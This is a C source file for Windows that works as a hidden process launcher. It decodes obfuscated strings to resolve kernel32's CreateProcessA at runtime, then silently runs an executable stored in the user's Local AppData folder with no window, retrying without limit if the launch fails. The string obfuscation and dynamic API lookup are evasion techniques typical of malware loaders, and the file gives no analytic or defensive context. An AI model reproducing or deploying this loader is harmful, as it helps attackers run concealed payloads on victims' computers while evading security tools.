#include <windows.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>
#include "enc.h"

typedef BOOL (WINAPI *LPCTRPRC)(
    LPCSTR,
    LPSTR,
    LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,
    BOOL,
    DWORD,
    LPVOID,
    LPCSTR,
    LPSTARTUPINFOA,
    LPPROCESS_INFORMATION
);


void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));

    LPCTRPRC crtprc = NULL;
    // decode encoded lib name 
    char* kr32dec = Decode("ICYjLC0ncGNsLCcv");
    char* crtprocN = Decode("CDE0IzwuEyMtKy4wIgM=");
    // LoadLibrary
    HMODULE kn32 = LoadLibraryA(kr32dec);
    if (kn32 == NULL){
        return;
    }
    // Get Function Adress(CreateProcessA)
    crtprc = (LPCTRPRC)GetProcAddress(kn32, crtprocN);
    if (crtprc == NULL ){
        return;
    } 

    // Run that function
    
    bool r = crtprc(NULL,
    szPath,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &si,
    &pi);

    if ( r==0 ){
        crtProc(szPath, si, pi);
    } 

    FreeLibrary(kn32);
}

int main() {
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char exPath[20];
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    TCHAR szPath[MAX_PATH];

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));
    char* exPTDEC = Decode("KC84JyY/bTQ6LQ==");
    char* dot = strchr(exPTDEC, '.');
    
    snprintf(exPath, sizeof(exPath),"\\%s", exPTDEC);
    // LoadLibrary
    // Get Function Adress (SHGetFolderPath)
    // Run that function
    if(SUCCEEDED(SHGetFolderPath(NULL, 
        CSIDL_LOCAL_APPDATA, 
        NULL, 
        0, 
        szPath))) 
    {
        strcat_s(szPath, sizeof(szPath)/sizeof(TCHAR), exPath);
        crtProc(szPath, si, pi);
    }

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );


    return 0;
}
